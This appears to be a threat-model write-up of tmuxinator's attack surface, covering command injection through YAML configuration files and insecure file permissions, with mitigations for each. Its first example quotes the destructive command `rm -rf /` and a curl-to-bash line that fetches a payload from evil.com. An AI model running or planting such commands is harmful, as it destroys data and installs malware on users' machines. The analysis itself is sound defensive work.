*   **Attack Surface: Malicious Configuration Files**
    *   **Description:** Attackers can inject arbitrary commands into tmuxinator configuration files (`.tmuxinator.yml`) that will be executed when a user starts the tmux session.
    *   **How Tmuxinator Contributes:** Tmuxinator directly parses and executes commands defined within these YAML configuration files. It trusts the content of these files to be safe.
    *   **Example:** An attacker modifies a `.tmuxinator.yml` file to include `before_script: "rm -rf /"` or `panes: ["curl http://evil.com/payload.sh | bash"]`. When the user starts the session, these commands are executed.
    *   **Impact:** Full compromise of the user's account and potentially the system, data loss, malware installation.
    *   **Risk Severity:** Critical
    *   **Mitigation Strategies:**
        *   Ensure configuration files have appropriate permissions (e.g., `chmod 600 ~/.tmuxinator.yml`) to restrict write access to the owner.
        *   Store configuration files in secure locations with restricted access.
        *   Implement version control for configuration files to track changes and revert malicious modifications.
        *   Educate users about the risks of using untrusted tmuxinator configurations.
        *   Consider using a configuration management system to centrally manage and enforce secure configurations.

*   **Attack Surface: Arbitrary Command Execution via Configuration**
    *   **Description:** The `before_script`, `after_script`, and pane `commands` directives in the configuration file allow for the execution of arbitrary shell commands.
    *   **How Tmuxinator Contributes:** Tmuxinator's core functionality involves executing these commands as part of setting up the tmux session.
    *   **Example:** A configuration file contains `before_script: "echo 'malicious action' >> /tmp/log.txt"` or `panes: ["sleep 10; echo 'another bad thing'"]`. These commands are executed in the user's shell environment.
    *   **Impact:** Arbitrary code execution with the user's privileges, potentially leading to data exfiltration, system modification, or denial of service.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   Avoid using dynamic or user-provided values directly within command directives in configuration files.
        *   If dynamic values are necessary, sanitize and validate them rigorously before including them in commands.
        *   Minimize the use of `before_script`, `after_script`, and pane `commands` where possible.
        *   Regularly review and audit configuration files for potentially dangerous commands.
        *   Consider using more declarative configuration approaches instead of relying heavily on script execution.

*   **Attack Surface: Insecure File Permissions on Configuration Files**
    *   **Description:** If configuration files have overly permissive file permissions, attackers can modify them to inject malicious commands.
    *   **How Tmuxinator Contributes:** Tmuxinator reads and executes commands from these files. If they are writable by unauthorized users, the integrity of the tool's operation is compromised.
    *   **Example:** A `.tmuxinator.yml` file has permissions `777`. Any user on the system can modify it to include malicious commands that will be executed when the legitimate user starts the session.
    *   **Impact:** Persistent compromise, as malicious commands will be executed every time the user starts the affected tmux session. Privilege escalation if the user has elevated privileges.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   Ensure configuration files have appropriate permissions (e.g., `chmod 600` for single-user, `chmod 700` for directory containing config files).
        *   Regularly check file permissions of configuration files.
        *   Implement automated checks or scripts to enforce secure file permissions.
